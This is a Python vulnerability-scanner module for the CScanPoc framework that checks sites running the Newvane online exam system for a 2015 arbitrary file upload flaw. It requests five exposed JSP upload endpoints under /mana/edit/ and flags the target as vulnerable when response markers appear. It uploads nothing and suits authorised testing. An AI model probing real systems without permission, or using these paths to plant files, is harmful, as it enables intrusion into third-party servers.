# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Newvane_0001'  # 平台漏洞编号，留空
    name = 'Newvane online exam 在线考试系统通用型任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-04-17'  # 漏洞公布时间
    desc = '''
        新风向科技致力于开发、引进、整合、传播各类优秀教育培训资源及相关软件系统技术，并配以卓越的技术力量和专业的顾问式服务，帮助客户建立一套快速有效的在线培训和考试模式。
        新风向在线考试系统平台系统通用型任意文件上传漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0108559'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Newvane(新风向在线考试系统)'  # 漏洞应用名称
    product_version = 'Newvane online exam'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '41fcaff6-b252-45ac-98aa-48891f5dcd2f'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2015-0108559
            payloads = [
                '/mana/edit/uploadattcah.jsp',
                '/mana/edit/attach_upload.jsp',
                '/mana/edit/uploadimg.jsp',
                '/mana/edit/uploadmult.jsp',
                '/mana/edit/uploadflash.jsp'
            ]
            for payload in payloads:
                #code, head, res, errcode, _ = curl.curl2(arg+payload)
                r = requests.get(self.target + payload)
                if r.status_code == 200 and ('_upload.jsp' in r.text or 'uploadnexturl' in r.text):
                    #security_hole('Arbitrary file upload vulnerability '+ arg + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
